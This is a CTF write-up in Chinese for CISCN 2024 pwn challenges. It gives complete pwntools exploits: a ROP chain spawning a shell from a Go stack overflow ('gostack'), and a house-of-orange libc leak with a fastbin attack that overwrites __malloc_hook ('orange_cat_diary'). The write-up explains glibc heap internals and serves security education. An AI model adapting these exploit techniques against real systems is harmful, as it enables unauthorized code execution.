---
title: ciscn2024初赛-Pwn-wp
date: 2024-05-20 19:45:19
category: wp
tags:
---

> pwn和web题目赛后环境 https://ctf.show/challenges

# pwn
## gostack
### 分析
go语言的栈溢出题，开始用的ida7.5，啥也逆不出来，后面换成ida8.3，都不用怎么逆就出来了
这里放一下ida7.5和ida8.3打开后的截图

![ida7.5](/img/wp/ciscn2024-初赛/gostack-ida7.5.png)

![ida8.3](/img/wp/ciscn2024-初赛/gostack-ida8.3.png)

上面第一张是ida7.5的，第二张是ida8.3的

大致看一下代码，运行一下，用cyclic测量溢出点
go语言运行报错后会直接打印错误的返回地址，就不用gdb调试了
![](/img/wp/ciscn2024-初赛/gostack-cyclic.png)

得出溢出点464
![](/img/wp/ciscn2024-初赛/gostack-cyclic-l.png)

后面就是正常的利用syscall获取shell的流程了

### exp
```python
from pwn import *

p = process("./gostack")

context.log_level = 'debug'

# ROPgadget
rdi = 0x4a18a5 #0x00000000004a18a5 : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret
rsi = 0x42138a #0x000000000042138a : pop rsi ; ret
rax = 0x40f984 #0x000000000040f984 : pop rax ; ret
rdx = 0x4944ec #0x00000000004944ec : pop rdx ; ret
ret = 0x40201a #0x000000000040201a : ret
syscall = 0x4616C9 #0x00000000004616C9 : syscall ; ret

addr = 0x5978d8 # 随便找一个能写的地址，不行就换一个

# function
main = 0x04A0AC0

# send
#gdb.attach(p))

# 在addr处写字符串
payload = b'\x00'*464 + p64(rax) + p64(0x0) + p64(rdi) + p64(0) + p64(0)*5 + p64(rsi) + p64(addr) + p64(rdx) + p64(0x30) + p64(syscall)
# 将addr处的字符串作为参数执行sys-execv
payload+= p64(rax) + p64(0x3b) + p64(rdi) + p64(addr) + p64(0)*5 + p64(rsi) + p64(0) + p64(rdx) + p64(0) + p64(syscall)

p.sendlineafter(b'Input your magic message :',payload)

p.recvuntil(b'Your magic message :')
p.sendline(b'/bin/sh\x00')

p.interactive()

```

## orange_cat_diary
### 分析
house of orange + fastbin attack

一道堆菜单题，但是限制了show和delete的次数
每次add操作后申请的堆内存无编号，都是针对ptr的操作
edit函数内可以多写8个字节，可以改写下一个chunk的size

### 思路
1. 通过edit溢出修改top_chunk的size，然后通过申请较大的chunk将原top chunk置入unsorted bin
2. 通过show泄露unsorted bin的bk指针，这个指针会指向main_arena结构体内部的一个变量，通过main_arena与libc的偏移泄露libc基址
3. 通过伪造chunk进行fastbin attack将堆分配到malloc_hook位置，写上one_gadget
4. 再次调用malloc即可获取shell

#### 修改top chunk的size
关于修改top chunk的size，需要修改后的top chunk的满足以下几个条件
1. 伪造的 size 必须要对齐到内存页
2. size 要大于 MINSIZE(0x10)
3. size 要小于之后申请的 chunk size + MINSIZE(0x10)
4. size 的 prev inuse 位必须为 1

对齐到内存页，即size(no_flag_bit)大小需要为2* SIZE_SZ的整数倍
所以我们修改top chunk的size为0xf91(0b1111 1001 0001)
0xf91最后一位为PRE_INUSE，去掉flag_bit最后4位为零（即满足对齐到内存页），并且大于0x10且小于我们要申请的0x1000

所以可以修改为0xf91

#### 计算偏移
关于如何计算main_arena与libc的偏移，main_arena是一个全局变量，这里有两种思路可以得知main_arena在libc中的偏移
1. 利用malloc_trim函数，这个函数会访问main_arena，可以通过这个函数在ida中找到偏移
```c
int
__malloc_trim (size_t s)
{
  int result = 0;

  if (__malloc_initialized < 0)
    ptmalloc_init ();

  mstate ar_ptr = &main_arena;//<=here!
  do
    {
      __libc_lock_lock (ar_ptr->mutex);
      result |= mtrim (ar_ptr, s);
      __libc_lock_unlock (ar_ptr->mutex);

      ar_ptr = ar_ptr->next;
    }
  while (ar_ptr != &main_arena);

  return result;
}
```

![](/img/wp/ciscn2024-初赛/malloc_trim.png)
可知本题所用libc与main_arena的偏移为 0x3C4B20

2. 利用malloc_hook算出
main_arena与malloc_hook的地址差为0x10，而malloc_hook的值可以用pwntools直接查到

![](/img/wp/ciscn2024-初赛/malloc_hook_and_main_arena.png)


```python
main_arena_offset = ELF("libc-2.23.so").symbols["__malloc_hook"] + 0x10
```

利用这两种方法之一，便可以算出main_arena在libc中的偏移了，调试获取bk和main_arena的偏移，即可计算libc_base

```python
libc_base = leak_bk - (main_arena_offset+1640) #1640是调试获取的偏移
```

#### 分配到malloc_hook
因为程序在free堆块之后没有清空，可以继续写值，那我们就可以修改这个堆块的fd指针指向一个addr
之后申请该大小的堆块之后，对应大小的fastbin指针就会指向fd指针，即addr
再次malloc申请内存时，由于对应的fastbin指针不为NULL，就会将addr作为堆块分配出来，即可实现任意地址写的操作

不过fastbin在分配内存时，会检测指针指向的地方(将其作为malloc_chunk)的size是不是和对应的fastbin大小相等，不是则报错

所以我们要找一个合适的addr，addr处为pre_size，这个可以为任意值，但addr+8必须为对应fastbin的size

下面是源码
```c
#define REMOVE_FB(fb, victim, pp)			\
  do							\
    {							\
      victim = pp;					\
      if (victim == NULL)				\
	break;						\
    }							\
  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim->fd, victim)) \
	 != victim);					\

  // 如果对齐之后的请求字节(nb)处于fastbin的范围中
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      //fastbin下标
      idx = fastbin_index (nb);
      //对应fastbin的头指针
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      //victim不为空，即对应的fastbin不为空
      if (victim != NULL)
	{
	  if (SINGLE_THREAD_P)
	    *fb = victim->fd;
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
        // 检查取到的 chunk 大小是否与相应的 fastbin 索引一致。
        // 根据取得的 victim ，利用 chunksize 计算其大小。
        // 利用fastbin_index 计算 chunk 的索引
        #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)

        /* Get size, ignoring use bits */
        #define chunksize(p) (chunksize_nomask (p) & ~(SIZE_BITS))

        /* Like chunksize, but do not mask SIZE_BITS.  */
        #define chunksize_nomask(p)         ((p)->mchunk_size)

        #define fastbin_index(sz) \
                ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)

	    size_t victim_idx = fastbin_index (chunksize (victim)); //这一句是检测的关键，我们要使计算后的victim_idx和idx相等

        //检测
	      if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");

        //更细致的检查，只在-DMALLOC_DEBUG时使用
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
		    {
		      if (SINGLE_THREAD_P)
			*fb = tc_victim->fd;
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		    }
		}
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
  // 对应的fastbin为空，检查smallbin
    }
```

我们调试一下看看__malloc_hook上方有没有满足要求的值 
```bash
pwndbg> x/10xg 0x7c63ee9ebaed 
0x7c63ee9ebaed <_IO_wide_data_0+301>:   0x63ee9ea260000000      0x000000000000007c
0x7c63ee9ebafd: 0x63ee6acea0000000      0x63ee6aca7000007c
0x7c63ee9ebb0d <__realloc_hook+5>:      0x000000000000007c      0x0000000000000000
0x7c63ee9ebb1d: 0x0000000000000000      0x0000000000000000
0x7c63ee9ebb2d <main_arena+13>: 0x0000000000000000      0x0000000000000000
```
我们看到，在__malloc__hook(地址为0x7c63ee9ebb10)的上方(__malloc__hook - 0x23 + 0x8)刚好有个0x7c(0b0111 1100)
我们计算一下 size_t victim_idx = fastbin_index (chunksize (victim));

```
chunksize_nomask(p) -> 0x7c(0b0111 1100)
chunksize(p) -> 0x78(0b0111 1000)
fast_index(sz)  -> ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) 
                -> ((((unsigned int) (sz)) >> 4) - 2) 
                -> (0x7)0b0111 - 2
                -> 5
```

|fastbinY|32位chunk|32位用户|64位chunk|64位用户|
|-----------|----|----|----|----|
|fastbinY[0]|0x18|0x08|0x20|0x10|
|fastbinY[1]|0x20|0x10|0x30|0x20|
|fastbinY[2]|0x28|0x18|0x40|0x30|
|fastbinY[3]|0x30|0x20|0x50|0x40|
|fastbinY[4]|0x38|0x28|0x60|0x50|
|fastbinY[5]|0x40|0x30|0x70|0x60|
|fastbinY[6]|0x48|0x38|0x80|0x70|

即fastbin的idx为5，对应chunk大小为0x70
当我们申请0x60到0x68字节大小的空间时，会先调用一个checked_request2size的宏转为0x70的chunk size
所以我们可以申请0x60~0x68的空间，即可绕过fastbin的检测

申请到的内存会转换为用户内存(+0x10)，所以此时__malloc_hook的位置在申请到的指针的0x13字节之后

### exp
```python
from pwn import *

p = process("./orange_cat_diary")

libc = ELF("./libc-2.23.so")

context.log_level = 'debug'

def add(size,content):
    p.sendlineafter(b'choice:',b'1')
    p.sendafter(b'content:',str(size).encode())
    p.sendafter(b'content:',content)

def show():
    p.sendlineafter(b'choice:',b'2')
    
def delete():
    p.sendlineafter(b'choice:',b'3')

def edit(size,content):
    p.sendlineafter(b'choice:',b'4')
    p.sendafter(b'content:',str(size).encode())
    p.sendafter(b'content:',content)

# gadget
one_gadget1 = 0x4527a
one_gadget2 = 0xf03a4
one_gadget3 = 0xf1247

p.sendlineafter(b"Hello, I'm delighted to meet you. Please tell me your name.",b'zzkkk1h')

#gdb.attach(p)

# 修改top chunk大小
add(0x68,b'aaaa')
edit(0x70,b'a'*0x68+p64(0xf91))

# 申请较大chunk使修改后的top chunk置入unsorted bin
add(0x1000,b'aaaa')

# 从unsorted bin中申请内存，填上8字节数据，show泄露bk指针内容，调试获取bk指针指向位置在main_arena的偏移
add(0x10,b'bbbbbbbb')
show()
p.recvuntil(b'bbbbbbbb')
libc_base = u64(p.recv(6).ljust(8,b'\x00'))-0x3c5188
print(hex(libc_base))

# 计算 malloc_hook 和 one_gadget 的地址
malloc_hook = libc_base + libc.sym["__malloc_hook"]
one_gadget = libc_base + one_gadget2

# 申请内存块
add(0x68,b'cccc')

# 删除刚刚申请的堆块，放入fastbin中
delete()

# 在fd指针位置写上malloc_hook-0x23的值，这个地址+8后刚好为0x7c，可以申请0x68大小的空间
edit(0x68,p64(malloc_hook-0x23))
add(0x68,b'dddd')

# 0x13字节后即为__malloc_hook的位置，写上one_gadget
add(0x68,b'a'*0x13+p64(one_gadget))

# 再次调用malloc就会执行__malloc_hook处的指令，即可获取shell
p.sendlineafter(b'choice:',b'1')
p.sendafter(b'content:',str(0x30).encode())
p.interactive()

```

## ez_buf
protobuf pwn

> Protobuf是一种高效的数据压缩编码方式，可用于通信协议，数据存储等
> 官方文档翻译: https://www.cnblogs.com/silvermagic/p/9087593.html

## EzHeap

## SuperHeap

## magic_vm

